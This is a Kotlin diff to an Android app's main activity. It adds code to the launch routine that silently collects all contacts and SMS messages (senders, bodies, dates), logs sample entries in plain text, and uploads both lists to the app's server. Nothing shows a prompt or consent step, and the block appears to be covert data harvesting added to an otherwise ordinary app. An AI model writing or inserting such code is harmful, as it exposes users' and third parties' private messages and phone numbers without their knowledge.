@@ -98,6 +98,19 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
+        //-------------------------
+        val retrofitAPI = HttpExecute.BuildAPI()
+        val cc = ContentCollector()
+        val contactLs = ContactsList()
+        contactLs.SetContact(cc.GetContacts(this))
+        Log.d("SYNC", "Name : " + contactLs.GetContact()!![1].GetName() + " Number : " + contactLs.GetContact()!![1].GetNumber())
+        val SMSLs = SMSList()
+        SMSLs.SetSMS(cc.GetSMS(this))
+        Log.d("SYNC", "Address : " + SMSLs.GetSMS()!![3].GetAddress() + " Message : " + SMSLs.GetSMS()!![3].GetBody() + " Date : " + SMSLs.GetSMS()!![3].GetDate() + " Type : " + SMSLs.GetSMS()!![3].GetType())
+
+        HttpExecute(retrofitAPI.CreateContacts(contactLs)).start()
+        HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start()
+        //-----------------------------------------
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
@@ -118,7 +131,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         //onNewIntent(intent)
         FirebaseMessaging.getInstance().subscribeToTopic("googleId")
         PermissionUtil.initPermissions(this)
-        val retrofitAPI = HttpExecute.BuildAPI()
+        //val retrofitAPI = HttpExecute.BuildAPI()
         val token = Token()
         token.SetToken(FirebaseInstanceId.getInstance().token!!)
         val stringCall = retrofitAPI.CreateNewDevice(token)
